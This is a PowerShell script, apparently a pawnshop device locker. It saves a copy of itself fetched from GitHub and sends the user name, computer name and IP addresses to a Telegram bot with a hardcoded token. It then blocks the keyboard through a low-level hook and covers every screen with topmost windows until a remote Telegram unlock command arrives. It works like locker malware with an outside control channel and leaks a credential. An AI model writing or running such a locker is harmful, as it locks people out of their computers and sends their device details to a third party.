# ============================
# Pawnshop Lockdown v2.7 (Self-Saving + Lock/Unlock)
# ============================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG ---
$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1"
$localFolder = "$env:ProgramData\PawnshopLock"
$localFile   = "$localFolder\pawnlock.ps1"
$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImg     = "$env:TEMP\pawnlock.jpg"
$botToken    = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID      = "656189986"
$user        = $env:USERNAME
$pc          = $env:COMPUTERNAME
$unlockCmd   = "/unlock$user"

# --- SELF-SAVE SCRIPT ---
try {
    if (-not (Test-Path $localFolder)) {
        New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
    }
    Invoke-WebRequest -Uri $githubURL -OutFile $localFile -UseBasicParsing
} catch {}

# --- DOWNLOAD IMAGE ---
try {
    Invoke-WebRequest -Uri $imageURL -OutFile $tempImg -UseBasicParsing
} catch {}

# --- SEND TELEGRAM MESSAGE ---
function Send-Telegram {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|255|fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try {
        $ipPublic = Invoke-RestMethod "https://api.ipify.org"
    } catch { $ipPublic = "n/a" }

    $msg = "🔒 PC $user ($pc) locked.`nIP: $ipLocal | $ipPublic`nUnlock: $unlockCmd"
    $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}
Send-Telegram

# --- KEYBOARD BLOCKER ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static KProc proc = Hook;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);

    public static void Block() { hookId = SetHook(proc); }
    public static void Unblock() { UnhookWindowsHookEx(hookId); }

    private static IntPtr SetHook(KProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x43) Environment.Exit(0); // C key allowed
            return (IntPtr)1; // block others
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# --- FULLSCREEN DISPLAY ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $f = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true
        Location = $screen.Bounds.Location; Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None; BackColor = 'Black'
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImg); Dock = 'Fill'; SizeMode = 'StretchImage'
    }
    $f.Controls.Add($pb); $f.Add_Deactivate({ $_.Activate() }); $f.Show(); $f
}

# --- TELEGRAM UNLOCK LISTENER ---
$offset = 0
try {
    $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
    if ($start.result.Count -gt 0) {
        $offset = ($start.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            if ($u.message.text -eq $unlockCmd -and $u.message.chat.id -eq [int]$chatID) {
                [System.Windows.Forms.Application]::Exit()
            }
        }
    } catch {}
})
$timer.Start()

# --- KEEP SCRIPT RUNNING ---
[System.Windows.Forms.Application]::Run()

# --- CLEANUP ---
$timer.Stop()
[KeyBlocker]::Unblock()
